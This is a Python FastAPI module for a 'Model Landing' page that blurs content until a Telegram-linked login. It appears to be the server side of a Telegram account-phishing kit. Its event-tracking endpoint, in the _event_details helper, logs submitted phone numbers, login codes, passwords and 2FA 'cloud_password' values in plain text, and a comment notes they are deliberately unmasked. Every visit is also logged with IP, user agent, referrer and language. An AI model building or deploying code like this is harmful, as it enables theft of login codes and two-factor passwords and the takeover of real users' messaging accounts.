from __future__ import annotations

import os
from typing import Any

from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from bot.config import load_dotenv
from landing.content_store import landing_store
from landing.logger import landing_logger

load_dotenv()

BOT_USERNAME = os.getenv("BOT_USERNAME", "").strip().lstrip("@")
SESSION_COOKIE = "landing_tg_uid"

templates = Jinja2Templates(directory="landing/templates")


def register_landing(app: FastAPI) -> None:
	"""Вешает лендинг на / текущего FastAPI-приложения."""
	os.makedirs("landing/media", exist_ok=True)
	os.makedirs("landing/static", exist_ok=True)

	if not any(getattr(r, "path", None) == "/landing-media" for r in app.routes):
		app.mount("/landing-media", StaticFiles(directory="landing/media"), name="landing-media")
	if not any(getattr(r, "name", None) == "static-landing" for r in app.routes):
		app.mount(
			"/static-landing",
			StaticFiles(directory="landing/static"),
			name="static-landing",
		)

	@app.get("/favicon.ico", include_in_schema=False)
	async def favicon():
		path = os.path.join("landing", "static", "favicon.png")
		if os.path.isfile(path):
			return FileResponse(path, media_type="image/png")
		return JSONResponse({"detail": "favicon not found"}, status_code=404)

	@app.get("/", response_class=HTMLResponse)
	async def landing_index(request: Request):
		content = await landing_store.load()
		unlocked = _is_unlocked(request, content)
		await landing_logger.event(
			"visit",
			ip=_ip(request),
			unlocked=unlocked,
			ua=_ua(request),
			ref=_ref(request),
			lang=_lang(request),
			details={
				"path": str(request.url.path),
				"query": str(request.url.query) or None,
				"cookie": "yes" if request.cookies.get(SESSION_COOKIE) else "no",
				"blur": content.blur_until_login,
				"nick": content.nick,
			},
		)
		return templates.TemplateResponse(
			"index.html",
			{
				"request": request,
				"content": content,
				"unlocked": unlocked,
				"bot_username": BOT_USERNAME,
			},
		)

	@app.get("/api/content")
	async def api_content(request: Request):
		content = await landing_store.load()
		unlocked = _is_unlocked(request, content)
		data = content.to_dict()
		data["locked"] = bool(content.blur_until_login and not unlocked)
		data["unlocked"] = unlocked
		return JSONResponse(data)

	@app.post("/api/auth/logout")
	async def auth_logout(request: Request):
		content = await landing_store.load()
		await landing_logger.event(
			"logout",
			ip=_ip(request),
			unlocked=_is_unlocked(request, content),
			ua=_ua(request),
			ref=_ref(request),
			lang=_lang(request),
		)
		response = JSONResponse({"ok": True})
		response.delete_cookie(SESSION_COOKIE)
		return response

	@app.post("/api/event")
	@app.post("/api/event/click")
	async def event_track(request: Request):
		body = await request.json()
		payload = body if isinstance(body, dict) else {}
		action = str(payload.get("action") or payload.get("place") or "event")
		details = _event_details(payload)
		content = await landing_store.load()
		unlocked = _is_unlocked(request, content)
		await landing_logger.event(
			action,
			ip=_ip(request),
			unlocked=unlocked,
			ua=_ua(request),
			ref=_ref(request),
			lang=_lang(request),
			details=details,
		)
		return JSONResponse({"ok": True, "need_login": not unlocked})


def create_landing_app() -> FastAPI:
	app = FastAPI(title="Model Landing", docs_url=None, redoc_url=None)
	register_landing(app)
	return app


def _is_unlocked(request: Request, content) -> bool:
	if not content.blur_until_login:
		return True
	return bool(request.cookies.get(SESSION_COOKIE))


def _ip(request: Request) -> str:
	forwarded = request.headers.get("x-forwarded-for")
	if forwarded:
		return forwarded.split(",")[0].strip()
	return request.client.host if request.client else "-"


def _ua(request: Request) -> str:
	return request.headers.get("user-agent") or "-"


def _ref(request: Request) -> str:
	return request.headers.get("referer") or "-"


def _lang(request: Request) -> str:
	return (request.headers.get("accept-language") or "-")[:80]


def _event_details(payload: dict) -> dict[str, Any]:
	skip = {"action", "place", "unlocked", "ua", "ref", "lang"}
	out: dict[str, Any] = {}
	if payload.get("place"):
		out["place"] = payload.get("place")
	for key, value in payload.items():
		if key in skip or value is None or value == "":
			continue
		# код / 2FA / телефон — в лог как есть (без маски и без *_len)
		if key in {"password", "code", "cloud_password", "phone"}:
			out[key] = str(value)
			continue
		out[key] = value
	return out


app = create_landing_app()
